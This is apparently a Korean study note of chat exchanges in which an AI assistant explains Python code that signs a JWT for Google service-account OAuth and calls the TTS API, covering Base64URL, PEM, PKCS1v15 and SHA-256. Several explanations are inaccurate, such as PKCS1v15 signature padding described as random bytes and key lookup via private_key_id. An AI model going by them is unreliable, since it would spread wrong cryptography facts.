# Main Concept
```
❯ 내가 생각한 기술적 메인은 JWT 와 WebSocket 이야. 그것만 Main Concept 로 정리했어. 어떻게 생각해?

● 좋은 정리입니다. 두 기술이 이 프로젝트의 핵심 축이 맞습니다.

  다만 한 가지 추가를 제안드리면:

  ---
  현재 정리

  JWT        — 인증
  WebSocket  — 실시간 통신

  ---
  추가 고려할 것 — Reactive Streams (Flux/Sink)

  이 프로젝트에서 JWT와 WebSocket을 연결하는 중간 다리가 Flux/Sink입니다:

  WebSocket (음성 청크 수신)
          ↓
  Sink.tryEmitNext()     ← 여기가 없으면
          ↓                 WebSocket과 STT가 연결 안 됨
  Flux<byte[]>
          ↓
  STT → LLM → TTS

  JWT와 WebSocket은 "무엇을" 하는지를 설명하고,
  Flux/Sink는 "어떻게" 연결하는지를 설명합니다.

  ---
  제안하는 구조

  JWT              — 인증 (Google API, 서비스 계정)
  WebSocket        — 실시간 통신 (브라우저 ↔ 서버)
  Flux / Sink      — 비동기 스트림 연결 (WebSocket → STT 파이프)

  ---
  물론 학습 목적에 따라 달라질 수 있습니다:

  인증에 집중      →  JWT만으로 충분
  통신에 집중      →  WebSocket만으로 충분
  전체 파이프라인  →  Flux/Sink도 포함
```

```
❯ Flux/Sink 내용이 MAIN_CONCEPT.md 에 정리되어져 있어.

● 파일 읽어볼게요.

  Read 1 file (ctrl+o to expand)

● 확인했습니다. MAIN_CONCEPT.md를 보니 이미 잘 정리되어 있네요.

  ---
  파일 구조를 보면:

  MAIN_CONCEPT.md
    ├── JWT 섹션
    │     ├── E2E-TEST-REAL.md 코드 + 주석
    │     ├── 각 개념 Q&A (rstrip, PEM, SHA256, PKCS1v15...)
    │     └── 사용자 로그인 vs 서버간 통신 비교
    │
    └── (이후 WebSocket, Flux/Sink 섹션 추정)

  제 제안은 필요 없었습니다. JWT, WebSocket, Flux/Sink 세 가지가 이미 하나의 문서에 통합되어 있으니 지금 구조 그대로가 맞습니다.

  오늘 대화에서 다룬 내용이 많은데 추가로 궁금한 부분 있으시면 말씀해 주세요.

```

# JWT
```
# Google TTS로 테스트 입력 음성 생성 (8kHz LINEAR16)
python3 << 'EOF'
import urllib.request, urllib.parse, json, base64, os, time
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend

creds_path = os.environ['GOOGLE_APPLICATION_CREDENTIALS']
with open(creds_path) as f:
    creds = json.load(f)

# JWT → Access Token
private_key = serialization.load_pem_private_key(creds['private_key'].encode(), password=None, backend=default_backend()) # JSON 파일에 private_key 이용해서 private_key 객체 생성. 이후 private_key 객체는 서명시 사용.
now = int(time.time())
header = base64.urlsafe_b64encode(json.dumps({'alg':'RS256','typ':'JWT'}).encode()).rstrip(b'=') # header 작성 및 인코딩
payload = base64.urlsafe_b64encode(json.dumps({
    'iss': creds['client_email'],
    'scope': 'https://www.googleapis.com/auth/cloud-platform',
    'aud': 'https://oauth2.googleapis.com/token',
    'exp': now + 3600, 'iat': now
}).encode()).rstrip(b'=') # payload 작성 및 인코딩
signing_input = header + b'.' + payload # 서명(signed) 할 데이터 조합
signature = base64.urlsafe_b64encode(private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())).rstrip(b'=') # 서명(signed) 할 데이터를 서명(signed) 함.
jwt = (signing_input + b'.' + signature).decode() # 최종 JWT 인코딩 문자열 조합.

data = urllib.parse.urlencode({'grant_type':'urn:ietf:params:oauth:grant-type:jwt-bearer','assertion':jwt}).encode() # 전송 규격에 맞게 조합.
with urllib.request.urlopen(urllib.request.Request('https://oauth2.googleapis.com/token', data=data)) as r: # 실제 요청 하고 응답 받음.
    token = json.load(r)['access_token'] # 응답에서 access_token 얻음.

body = json.dumps({
    'input': {'text': '안녕하세요. 무엇을 도와드릴까요?'},
    'voice': {'languageCode': 'ko-KR', 'name': 'ko-KR-Neural2-A'},
    'audioConfig': {'audioEncoding': 'LINEAR16', 'sampleRateHertz': 8000}
}).encode() # Google TTS 요청 위한 body 작성.
req = urllib.request.Request(
    'https://texttospeech.googleapis.com/v1/text:synthesize', data=body,
    headers={'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
) # Google TTS 요청 Reqeust 조합.
with urllib.request.urlopen(req) as r: # Google TTS 요청
    audio = base64.b64decode(json.load(r)['audioContent'])
    open('/tmp/korean-test.pcm', 'wb').write(audio)
    print(f'생성 완료: {len(audio)} bytes') # Google TTS 응답에서 audioContent 저장된 인코딩으로 PCM 파일 작성.
EOF
```

```
❯ .rstrip(b'=') 왜 있는거지?

● .rstrip(b'=')

  Base64 인코딩의 패딩 문자 =를 제거하는 것입니다.

  ---
  Base64 패딩이란?

  Base64는 3 bytes를 4자리로 변환합니다.

  데이터가 3의 배수가 아니면 빈 자리를 =로 채움

  "A"    →  1 byte  →  QQ==   (= 2개로 패딩)
  "AB"   →  2 bytes →  QUI=   (= 1개로 패딩)
  "ABC"  →  3 bytes →  QUJD   (= 없음, 딱 맞음)

  ---
  JWT에서 =를 제거하는 이유

  JWT는 URL에 포함될 수 있는데, =가 URL에서 문제를 일으킵니다.

  일반 Base64:   eyJhbGci==
  URL에서:       eyJhbGci%3D%3D  ← = 가 %3D로 인코딩되어 지저분해짐

  그래서 JWT는 Base64URL 방식을 씁니다:

  =  제거    (rstrip)
  +  → -    로 교체
  /  → _    로 교체

  이 코드에서는 = 제거만 했습니다:

  header = base64.urlsafe_b64encode(...).rstrip(b'=')
  #                                      ↑
  #                              = 패딩 문자 제거

  ---
  검증 시 복원은?

  Google 서버가 JWT를 받으면 =를 다시 붙여서 디코딩합니다. 길이를 보면 몇 개가 빠졌는지 계산할 수 있기 때문에 정보 손실이 없습니다.

  # 디코딩 시 = 복원
  padded = token + '=' * (4 - len(token) % 4)
  base64.urlsafe_b64decode(padded)

  ▎ =는 실제 데이터가 아닌 자리 채우기용이라 제거해도 원본 복원이 가능합니다.

```

```
❯ urlsafe_b64encode 와 b64encode 차이가 뭐야?

● b64encode vs urlsafe_b64encode

  둘 다 Base64 인코딩이지만 일부 문자가 다릅니다.

  ---
  차이

  ┌──────┬─────────────┬──────────────────────────┐
  │      │  b64encode  │    urlsafe_b64encode     │
  ├──────┼─────────────┼──────────────────────────┤
  │ 표준 │ 일반 Base64 │ Base64URL                │
  ├──────┼─────────────┼──────────────────────────┤
  │ +    │ + 그대로    │ - 로 교체                │
  ├──────┼─────────────┼──────────────────────────┤
  │ /    │ / 그대로    │ _ 로 교체                │
  ├──────┼─────────────┼──────────────────────────┤
  │ =    │ = 그대로    │ 보통 .rstrip() 으로 제거 │
  └──────┴─────────────┴──────────────────────────┘

  ---
  왜 + / 가 문제인가

  일반 Base64 결과:  eyJhbG+ci/OiJ
  URL에 포함 시:     eyJhbG%2Bci%2FOiJ  ← + → %2B, / → %2F 로 변환
                                          지저분하고 깨질 위험

  +와 /는 URL에서 특수한 의미를 가집니다:

  +  →  URL에서 공백(스페이스) 의미
  /  →  URL에서 경로 구분자 의미

  ---
  실제 차이 예시

  import base64

  data = b'\xfb\xff\xfe'  # +, / 가 나오는 데이터

  print(base64.b64encode(data))
  # b'+//+'   ← + 와 / 포함

  print(base64.urlsafe_b64encode(data))
  # b'-__-'   ← - 와 _ 로 교체

  ---
  JWT가 urlsafe_b64encode 를 쓰는 이유

  JWT 사용처:
      URL 쿼리파라미터  ?token=eyJhbG...
      HTTP 헤더        Authorization: Bearer eyJhbG...
      Cookie           jwt=eyJhbG...

  → 어디서든 안전하게 쓰려면 URL 안전 문자만 써야 함
  → urlsafe_b64encode + rstrip(=) 조합 사용

  ---
  한 줄 요약

  ▎ 내용물은 동일하고, URL에서 문제가 되는 + / = 를 - _ 제거로 바꾼 것이 urlsafe_b64encode 입니다.

```

```
## JWT란?

**JWT = JSON Web Token**. 쉽게 말하면 **"위조하기 어려운 신분증"** 입니다.

### 왜 필요한가?

HTTP는 **무상태(stateless)** 입니다. 요청마다 "이 사람이 누군지" 서버가 기억하지 못합니다.

```
기존 방식 (세션):
사용자 → 로그인 → 서버가 세션 저장 → 쿠키로 세션ID 전달
      → 다음 요청에 세션ID 가져와서 서버 메모리에서 조회

JWT 방식:
사용자 → 로그인 → 서버가 토큰 발급 → 사용자가 토큰 보관
       → 다음 요청에 토큰 첨부 → 서버가 서명만 검증 (DB 조회 불필요)
```

---

## JWT 구조

JWT는 `.`으로 구분된 **3 파트**입니다.

```
eyJhbGciOiJIUzI1NiJ9   .   eyJ1c2VySWQiOiIxMjMifQ   .   xyzABC...
       ↑                           ↑                         ↑
    Header                       Payload                  Signature
  (알고리즘 정보)              (담을 데이터)              (위조 방지 서명)
```

Base64로 디코딩하면:

```json
// Header
{ "alg": "HS256", "typ": "JWT" }

// Payload
{ "userId": "123", "role": "ADMIN", "exp": 1750000000 }

// Signature = HMAC_SHA256(header + "." + payload, 비밀키)
```

> Payload는 **암호화가 아닌 인코딩**입니다. 누구나 볼 수 있으니 비밀번호 같은 민감정보는 절대 넣지 마세요.

```

```
[USER]
네가 Spring 소스로 말한 것 잘 이해안가. JWT 구조 다시 설명하면서 E2E-TEST-REAL.md 에 "방법 2 — python3-cryptography + JWT 직접 서명 방식 (성공)" 의 소스로 쉽게 설명. 이해가 안 가는데 현재 JSON 파일을 읽어서 뭔가 작업하는데 너는 왜 선행으로 로그인 요청이
있다고 하는지 모르겠어.

[ASSISTANT]
맞는 지적입니다. 이 코드엔 로그인이 전혀 없어요. 다시 제대로 설명할게요.

---

## 이 코드의 목적

**"Google TTS API를 호출하려면 신분증이 필요한데, 그 신분증을 만드는 과정"** 입니다.

서비스 계정 JSON 파일(`GOOGLE_APPLICATION_CREDENTIALS`)에 이미 신원 정보가 다 들어 있어요. 로그인이 필요 없습니다.

---

## JWT 구조 — 이 코드 기준

```
JWT = Header.Payload.Signature
```

코드에서 각 파트가 어떻게 만들어지는지:

```python
# ① Header — "이 JWT는 RSA-SHA256으로 서명했다"
header = base64.urlsafe_b64encode(
    json.dumps({'alg':'RS256', 'typ':'JWT'}).encode()
).rstrip(b'=')
# 결과: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9

# ② Payload — "누가, 무슨 권한으로, 언제까지 쓸 건지"
payload = base64.urlsafe_b64encode(
    json.dumps({
        'iss': creds['client_email'],  # 서비스 계정 이메일 (신원)
        'scope': 'https://www.googleapis.com/auth/cloud-platform',  # 요청 권한
        'aud': 'https://oauth2.googleapis.com/token',  # 이 JWT를 보낼 대상
        'exp': now + 3600,  # 만료: 1시간 후
        'iat': now          # 발급 시각
    }).encode()
).rstrip(b'=')
# 결과: eyJpc3MiOiJ4eHhAeHh4Lmlhb...

# ③ Signature — "서비스 계정 JSON의 private_key로 서명 (위조 방지)"
signing_input = header + b'.' + payload
signature = base64.urlsafe_b64encode(
    private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
).rstrip(b'=')

# ④ 합치기
jwt = (signing_input + b'.' + signature).decode()
# eyJhbG....eyJpc3M....xyzABC...
```

---
## 전체 흐름

```
서비스계정.json 파일
  │
  │  private_key 꺼내기
  ▼
JWT 직접 서명 (Header.Payload.Signature)
  │
  │  POST https://oauth2.googleapis.com/token
  │  { assertion: jwt }
  ▼
Google이 서명 검증 후 Access Token 발급
  { "access_token": "ya29.xxx..." }
  │
  │  Authorization: Bearer ya29.xxx...
  ▼
Google TTS API 호출 성공
```

---

## 핵심 포인트

이 JWT는 **"Google한테 내가 이 서비스 계정 주인임을 증명하는 서류"** 입니다.

- JSON 파일 안의 `private_key`로 서명 → Google은 `public_key`로 검증
- 검증 통과 → Access Token 발급
- Access Token으로 TTS API 호출

로그인이 없는 이유는, **서비스 계정 JSON 파일 자체가 이미 신원 증명서**이기 때문입니다. 사람이 아니라 서버 간 통신이라 아이디/비밀번호 대신 이 방식을 씁니다.

```

```
[USER]
Payload 에 들어가는 iss, aud, exp, iat, scope 원래 단어와 그 외 다른 항목은 없는지?

[ASSISTANT]
## JWT Payload 표준 필드 (RFC 7519)

### 이 코드에서 쓴 필드

| 축약 | 원래 단어 | 의미 |
|---|---|---|
| `iss` | **Issuer** | 발급자 — 이 JWT를 만든 주체 (서비스 계정 이메일) |
| `aud` | **Audience** | 수신자 — 이 JWT를 받을 대상 (Google OAuth2 서버) |
| `exp` | **Expiration Time** | 만료 시각 (Unix timestamp) |
| `iat` | **Issued At** | 발급 시각 (Unix timestamp) |
| `scope` | scope | Google 전용 커스텀 필드 — 요청할 권한 범위 |

> `scope`는 JWT 표준이 아니라 **Google이 추가한 필드**입니다.

---

### 표준에 있지만 이 코드에서 안 쓴 필드

| 축약 | 원래 단어 | 의미 |
|---|---|---|
| `sub` | **Subject** | 토큰의 주체 — 보통 사용자 ID |
| `nbf` | **Not Before** | 이 시각 이전엔 토큰 유효하지 않음 |
| `jti` | **JWT ID** | 토큰 고유 ID — 재사용 방지용 |

---

### 언제 뭘 쓰나

```
서버 간 통신 (이 코드처럼)     →  iss, aud, exp, iat
사용자 로그인 토큰              →  sub, exp, iat, (nbf)
토큰 재사용 방지 필요 시        →  jti 추가
```

`sub`가 빠진 이유는 이 JWT가 **사용자가 아닌 서비스 계정(서버)**이 주체라서, `iss` 하나로 신원을 표현하기 때문입니다.

```

```
[USER]
'private_key 꺼내기'는 private_key = serialization.load_pem_private_key(creds['private_key'].encode(), password=None, backend=default_backend()) 말하는거야? 맞다면 좀 더 자세히 말해줘.

[ASSISTANT]
네 맞습니다. 그 코드입니다.

---

## `load_pem_private_key()` 분해

```python
private_key = serialization.load_pem_private_key(
    creds['private_key'].encode(),   # ①
    password=None,                   # ②
    backend=default_backend()        # ③
)
```

---

---

### ① `creds['private_key'].encode()`

`creds`는 서비스 계정 JSON 파일을 읽은 딕셔너리입니다.

```json
{
  "type": "service_account",
  "client_email": "voicebot@xxx.iam.gserviceaccount.com",
  "private_key": "-----BEGIN RSA PRIVATE KEY-----\nMIIEow...\n-----END RSA PRIVATE KEY-----\n",
  "private_key_id": "abc123"
}
```

`creds['private_key']`는 위에서 `"-----BEGIN RSA PRIVATE KEY-----\n..."` 문자열을 꺼냅니다.

`.encode()`는 Python 문자열(str) → 바이트(bytes)로 변환합니다. `load_pem_private_key()`가 bytes만 받기 때문입니다.

---

### ② `password=None`

PEM 파일은 개인키를 추가로 비밀번호로 암호화할 수 있습니다.

```
암호화된 PEM:   -----BEGIN ENCRYPTED PRIVATE KEY-----
암호화 안 된 PEM: -----BEGIN RSA PRIVATE KEY-----
```

Google 서비스 계정 JSON의 `private_key`는 암호화되지 않은 상태로 저장되어 있어서 `password=None`입니다.

---

### ③ `backend=default_backend()`

cryptography 라이브러리가 내부적으로 OpenSSL을 쓰는데, 그 연결 다리입니다. 최신 버전에서는 생략 가능하지만 호환성을 위해 명시한 것입니다.

---

### 결과물 `private_key`

로드 후 `private_key` 객체로 할 수 있는 것:

```python
# 이 코드에서 실제로 쓴 것 — 데이터에 서명
signature = private_key.sign(
    signing_input,       # 서명할 데이터 (Header.Payload)
    padding.PKCS1v15(),  # RSA 패딩 방식
    hashes.SHA256()      # 해시 알고리즘
)
```

한 줄로 요약하면:

> JSON 파일 안에 텍스트로 저장된 개인키 문자열을 꺼내서, 암호화 연산에 쓸 수 있는 객체로 변환하는 것

```

```
[USER]
load_pem_private_key() 뭐야?

[ASSISTANT]
## `load_pem_private_key()`

Python `cryptography` 라이브러리의 함수입니다.

---

### PEM이 뭔가부터

PEM은 개인키를 **텍스트로 저장하는 형식**입니다.

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2a2rwplBQLF29amygykEMmYz0+Kcj3bKBp29Ag9gdHoP
mBDCFMKG3lMJBTMBUZpHWi7HgMgFCBMBLFZpZXm4gFCBMBLFZpZXm4...
-----END RSA PRIVATE KEY-----
```

실제로는 바이너리 데이터인데, 이메일/파일로 주고받기 편하게 Base64 텍스트로 감싼 것입니다.

---

### `load_pem_private_key()`가 하는 일

```
"-----BEGIN RSA PRIVATE KEY-----\nMIIE..."  ← JSON 파일 안의 문자열
                    ↓
          load_pem_private_key()
                    ↓
         RSAPrivateKey 객체        ← 서명 연산에 쓸 수 있는 형태
```

**텍스트 → 암호화 연산 가능한 객체**로 변환하는 것입니다.

책에 비유하면:

```
PDF로 저장된 악보      →  load_pem_private_key()  →  피아니스트가 연주 가능한 악보
(텍스트, 읽기만 가능)                               (객체, 연산 가능)
```

---

### 변환 후 무엇이 달라지나

```python
# 변환 전 — 그냥 문자열, 아무것도 못함
creds['private_key']  # "-----BEGIN RSA PRIVATE KEY-----\n..."

# 변환 후 — 서명 연산 가능
private_key.sign(data, padding.PKCS1v15(), hashes.SHA256())
```

이 코드에서는 변환된 객체로 **JWT에 서명**하는 것이 목적입니다.

```

```
[USER]
PEM 단어 풀이와 의미 알려줘. 왜 필요하고 비교할 만한 것과 비교해줘.

[ASSISTANT]
## PEM

**Privacy Enhanced Mail** — 직역하면 "개인정보 보호 메일"

---

### 탄생 배경

1990년대 이메일로 암호화 키를 주고받아야 했는데, 키는 원래 **바이너리(이진 데이터)** 입니다.

```
바이너리:  00 01 FF 3A 00 02 AB ...  ← 이메일로 보내면 깨짐
```

이메일은 텍스트만 안전하게 전송할 수 있었기 때문에, 바이너리를 **Base64 텍스트로 변환**해서 주고받는 형식을 만든 것이 PEM입니다.

---

### PEM 생김새

```
-----BEGIN RSA PRIVATE KEY-----   ← 시작 표시 (무슨 데이터인지)
MIIEowIBAAKCAQEA2a2rwplBQLzm
kBDCFMKG3lMJBTMBUZpHWi7HgMg    ← 바이너리를 Base64로 인코딩한 텍스트
FMBLFZpZXm4gFCBMBLFZpZXm4...
-----END RSA PRIVATE KEY-----    ← 끝 표시
```

구조는 단순합니다:
```
시작줄  +  Base64(바이너리 데이터)  +  끝줄
```
---

### 왜 지금도 쓰나

이메일 시대는 지났지만 **텍스트로 다루기 편하다**는 장점이 그대로 유효합니다.

```bash
# 파일로 저장 가능
cat private_key.pem

# 복사/붙여넣기 가능
# JSON 파일 안에 문자열로 포함 가능  ← 이 프로젝트가 이 경우
{
  "private_key": "-----BEGIN RSA PRIVATE KEY-----\nMIIE..."
}
```

---

### 비교

| | **PEM** | **DER** | **JWK** |
|---|---|---|---|
| 형식 | Base64 텍스트 | 바이너리 | JSON |
| 확장자 | `.pem`, `.key`, `.crt` | `.der`, `.cer` | `.json` |
| 눈으로 읽기 | 가능 (Base64) | 불가 | 가능 |
| 파일/이메일 전송 | 편함 | 불편 | 편함 |
| 주요 사용처 | Linux 서버, OpenSSL, Google 서비스 계정 | Windows, Java KeyStore | JWT, OAuth2 API |

---

### 한 줄 요약

> 바이너리 키를 텍스트 파일로 저장하고 주고받기 위한 포장 형식.
> 내용물(실
```

```
[USER]
"padding.PKCS1v15(),  # RSA 패딩 방식" 대해서 쉽게 말해줘.

[ASSISTANT]
## 패딩(Padding)이란?

먼저 패딩부터.

RSA는 **딱 정해진 크기의 데이터만** 서명할 수 있습니다. 데이터가 그 크기보다 작으면 빈 공간이 생깁니다.

```
RSA가 처리할 수 있는 블록 크기: 256 bytes
실제 서명할 데이터:              20 bytes

┌─────────────────────────────────────┐
│  실제 데이터 (20 bytes)              │  빈 공간 (236 bytes) 어떻게?
└─────────────────────────────────────┘
```

이 **빈 공간을 어떻게 채울지**가 패딩 방식입니다.

---

## PKCS1v15가 채우는 방법

```
┌────┬──────────────────────────┬────┬──────────────┐
│ 00 │  랜덤 바이트들 (FF FF..) │ 00 │  실제 데이터  │
└────┴──────────────────────────┴────┴──────────────┘
  고정         빈 공간 채우기      구분    서명할 데이터
```

규칙이 정해져 있어서 Google 서버가 받았을 때 **어디서 실제 데이터가 시작하는지** 알 수 있습니다.

---

## 왜 그냥 0으로 채우면 안 되나?

```
┌────┬──────────────────────────┬──────────────┐
│ 00 │  0000000000000000000000  │  실제 데이터  │
└────┴──────────────────────────┴──────────────┘
```

0으로만 채우면 공격자가 패턴을 예측할 수 있어서 위조가 쉬워집니다. 랜덤 바이트로 채워야 예측이 불가능합니다.
---

## PKCS1v15 vs OAEP (현재 권장)

| | **PKCS1v15** | **OAEP** |
|---|---|---|
| 출시 | 1993년 | 1998년 |
| 보안 | 취약점 발견됨 | 더 안전 |
| 사용처 | 레거시, 호환성 | 신규 시스템 권장 |

이 코드에서 PKCS1v15를 쓰는 이유는 **Google OAuth2 서버가 이 방식을 요구**하기 때문입니다. 선택의 여지가 없습니다.

---

### 한 줄 요약

> RSA 서명 시 데이터 크기를 맞추기 위해 빈 공간을 **예측 불가능한 랜덤값으로 채우는 규칙**입니다.

```

```
[USER]
hashes.SHA256() 도 설명해줘

[ASSISTANT]
## `hashes.SHA256()`

**SHA-256** = **Secure Hash Algorithm 256-bit**

---

## 해시(Hash)란?

어떤 데이터든 **고정 크기의 문자열로 변환**하는 함수입니다.

```
"안녕하세요"        →  SHA-256  →  a1b2c3d4e5f6... (64자리 고정)
"안녕하세요!"       →  SHA-256  →  9f8e7d6c5b4a... (64자리 고정)
"War and Peace" (대용량 소설)  →  SHA-256  →  3c4d5e6f7a8b... (64자리 고정)
```

특징 3가지:
```
① 입력이 조금만 달라도 결과가 완전히 달라짐 (눈사태 효과)
② 결과로 원본을 역추적 불가능
③ 같은 입력 → 항상 같은 결과
```

---

## 이 코드에서 왜 쓰나

JWT 서명할 때 **데이터 전체를 RSA로 암호화하면 너무 느립니다.**

```
Header.Payload 전체 (수백 bytes)
        ↓  SHA-256
   고정 32 bytes 지문
        ↓  RSA 서명
      훨씬 빠름
```

순서:
```
서명할 데이터 (Header.Payload)
        ↓ SHA-256 해시
   32 bytes 지문 생성
        ↓ RSA private_key로 암호화
      Signature 완성
```
Google 서버에서 검증할 때:
```
받은 Header.Payload
        ↓ SHA-256 해시
   32 bytes 지문 생성
        ↓ 보내온 Signature와 비교
      일치하면 위조 없음 ✅
```

---

## SHA 계열 비교

| | **SHA-1** | **SHA-256** | **SHA-512** |
|---|---|---|---|
| 출력 크기 | 160 bit (40자) | 256 bit (64자) | 512 bit (128자) |
| 보안 | 취약점 발견 ❌ | 현재 표준 ✅ | 더 강력하나 느림 |
| 사용처 | 레거시 | JWT, TLS, 대부분 | 고보안 요구 시 |

---

## PKCS1v15와 SHA-256의 관계

```python
private_key.sign(
    signing_input,       # 서명할 데이터
    padding.PKCS1v15(),  # 빈 공간 채우는 방식
    hashes.SHA256()      # 데이터를 32bytes로 압축하는 방식
)
```

둘은 **역할이 다릅니다.**

```
SHA-256    → 데이터를 32bytes 지문으로 압축
PKCS1v15   → 그 지문을 RSA 블록 크기에 맞게 패딩
```

### 한 줄 요약

> 데이터를 **고정 크기 지문으로 변환**하는 함수. 위조 감지와 성능 향상을 위해 RSA 서명 전에 먼저 적용합니다.

```

```
[USER]
32 bytes 지문 생성 => 64자리라면서 왜 32bytes 인지?

[ASSISTANT]
좋은 질문입니다.

---

## 32 bytes = 64자리 이유

SHA-256의 출력은 **256 bit** 입니다.

```
256 bit ÷ 8 = 32 bytes        (컴퓨터 내부 저장 단위)
32 bytes × 2 = 64자리         (사람이 읽는 16진수 표현)
```

---

## 왜 1 byte가 16진수 2자리인가

1 byte = 8 bit = 0~255 범위

255를 16진수로 표현하면 `FF` — 두 자리가 필요합니다.

```
1 byte  →  FF  (16진수 2자리)
32 bytes →  64자리
```

예시:
```
byte 값: 255  →  16진수: FF
byte 값: 10   →  16진수: 0A
byte 값: 172  →  16진수: AC
```

---

## 실제 SHA-256 결과

```
"안녕하세요" → SHA-256

내부 저장 (32 bytes):
[a1][b2][c3][d4][e5][f6]...(32개)

화면 출력 (64자리 16진수):
a1b2c3d4e5f6... (64자리)
```

---

### 한 줄 요약

> 32 bytes와 64자리는 **같은 데이터를 다르게 표현한 것**입니다.
> 32 bytes = 컴퓨터 저장 단위, 64자리 = 사람이 읽는 16진수 표현.

```

```
[USER]
서명할 데이터 (Header.Payload) 은 signing_input = header + b'.' + payload 말하는거지?

[ASSISTANT]
네, 맞습니다.

```python
signing_input = header + b'.' + payload
```

이게 바로 서명할 데이터입니다. 실제로 어떻게 생겼는지 보면:

```python
header  = b'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9'
payload = b'eyJpc3MiOiJ2b2ljZWJvdEBxeHguaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCAic2NvcGUiOi4uLn0'

signing_input = header + b'.' + payload
# 결과:
# eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ2b2ljZWJvdEBxeHguaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCAic2NvcGUiOi4uLn0
```

그리고 이걸 서명해서 Signature를 만들고, 마지막에 셋을 합칩니다:

```python
# 서명
signature = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())

# 최종 JWT 완성
jwt = signing_input + b'.' + signature
#     ↑               ↑      ↑
#   Header.Payload    .    Signature
```

즉 JWT 완성까지 `.`이 두 번 찍힙니다:

```
eyJhbGci...   .   eyJpc3Mi...   .   xyzABC...
   Header      .    Payload      .   Signature
```
```

```
[USER]
받은 Header.Payload 은 header 부분과 Payload 부분을 합쳐서 지문(SHA-256) 변환하고 signature 와 비교해서 같으면 검증이 된거다. 맞어?

[ASSISTANT]
네, 정확합니다.

검증 흐름을 그림으로 보면:

```
Google 서버가 JWT를 받았을 때

받은 JWT:
eyJhbGci....  .  eyJpc3Mi....  .  xyzABC...
   Header     .    Payload     .  Signature
      │                              │
      └──────────┐                  │
                 ▼                  │
         SHA-256 해시               │
                 ↓                  │
            32 bytes 지문           │
                 │                  │
                 ▼                  ▼
              비교 ◀───────── Signature 복호화
                 │           (Google이 가진
                 │            public_key로)
        ┌────────┴────────┐
        ↓                 ↓
      일치 ✅           불일치 ❌
   토큰 유효          위조된 토큰
```

한 가지만 추가하면, Signature를 비교할 때 Google 서버는 **public_key**로 Signature를 복호화해서 지문을 꺼낸 뒤 비교합니다.

```
우리가 서명할 때   →  private_key로 암호화
Google이 검증할 때 →  public_key로 복호화 → Header.Payload 해시와 비교
```

private_key로 암호화한 것은 **반드시 쌍을 이루는 public_key로만** 복호화됩니다. Google은 우리 서비스 계정의 public_key를 이미 알고 있어서 검증이 가능한 구조입니다.

```

```
[USER]
보여준 구조도를 보면 Header 만 지문(SHA-256)인 것 같은데 Header + Payload 맞지 않어?
  받은 JWT:
  eyJhbGci....  .  eyJpc3Mi....  .  xyzABC...
     Header     .    Payload     .  Signature
        │                              │
        └──────────┐                  │
                   ▼                  │
           SHA-256 해시               │
                   ↓                  │
              32 bytes 지문           │
                   │                  │
                   ▼                  ▼
                비교 ◀───────── Signature 복호화
                   │           (Google이 가진
                   │            public_key로)
          ┌────────┴────────┐
          ↓                 ↓
        일치 ✅           불일치 ❌
     토큰 유효          위조된 토큰


[ASSISTANT]
맞습니다. 제 그림이 잘못됐습니다. Header 화살표만 그려서 오해를 줬네요.

올바른 그림:

```
받은 JWT:
eyJhbGci....  .  eyJpc3Mi....  .  xyzABC...
   Header     .    Payload     .  Signature
      │                │              │
      └────────┬────────┘             │
               ▼                      │
       SHA-256 해시                   │
       (Header + "." + Payload)       │
               ↓                      │
          32 bytes 지문               │
               │                      │
               ▼                      ▼
            비교 ◀───────── Signature 복호화
               │           (Google이 가진
               │            public_key로)
      ┌────────┴────────┐
      ↓                 ↓
    일치 ✅           불일치 ❌
 토큰 유효          위조된 토큰
```

Header와 Payload 둘 다 화살표가 합쳐져서 SHA-256으로 들어가는 게 맞습니다.

```

```
[USER]
public_key 는 어디서 오는거야?

[ASSISTANT]
## public_key는 어디서 오나

서비스 계정 JSON 파일을 Google이 발급할 때, **private_key와 public_key 쌍을 같이 만듭니다.**

```
Google Cloud Console에서 서비스 계정 키 생성
                ↓
Google가 key pair 생성
    ├── private_key  →  JSON 파일에 담아서 우리한테 줌
    └── public_key   →  Google 서버에 보관
```

---

## 흐름

```
우리                              Google 서버
 │                                    │
 │  서비스 계정 키 생성 요청            │
 │ ─────────────────────────────────▶ │
 │                                    │ private_key + public_key 생성
 │  JSON 파일 (private_key 포함) 받음  │ public_key는 Google 서버에 저장
 │ ◀───────────────────────────────── │
 │                                    │
 │  JWT 서명 (private_key 사용)        │
 │ ─────────────────────────────────▶ │ 보관 중인 public_key로 검증
 │                                    │
```

---

## 핵심

우리가 public_key를 따로 전달할 필요가 없습니다.

Google이 키를 발급할 때 **이미 public_key를 자기 서버에 저장해뒀기 때문**입니다. JWT를 받으면 `private_key_id` 필드로 어떤 키 쌍인지 찾아서 검증합니다.

```json
{
  "private_key_id": "abc123",   ← 이걸로 Google이 어떤 public_key 쓸지 찾음
  "private_key": "-----BEGIN RSA PRIVATE KEY-----..."
}
```
```

```
[USER]
위 설명에서 보면 '사용자 로그인 토큰' 있는데 JWT 처리과정이 '서버 간 통신', ' 사용자 로그인 토큰' 나눠지는 것이고 처리 준비나 과정이 다른지?
  서버 간 통신 (이 코드처럼)     →  iss, aud, exp, iat
  사용자 로그인 토큰              →  sub, exp, iat, (nbf)
  토큰 재사용 방지 필요 시        →  jti 추가

[ASSISTANT]
## JWT는 하나, 용도에 따라 내용물이 다를 뿐

JWT 구조 자체(Header.Payload.Signature)와 서명/검증 방식은 **완전히 동일**합니다. 다른 것은 Payload 안에 뭘 담느냐입니다.

---

## 비교

| | **서버 간 통신** (이 코드) | **사용자 로그인** |
|---|---|---|
| 신원 증명 | 서비스 계정 JSON의 private_key | 아이디/비밀번호 |
| 서명 주체 | 우리 서버 | 우리 서버 |
| 검증 주체 | Google 서버 | 우리 서버 |
| key pair | Google이 발급 | 우리가 직접 생성 |
| Payload | iss, aud, exp, iat | sub, exp, iat |

---

## 처리 과정 비교

### 서버 간 통신 (이 코드)
```
서비스 계정 JSON (private_key)
        ↓ 처음부터 키가 있음
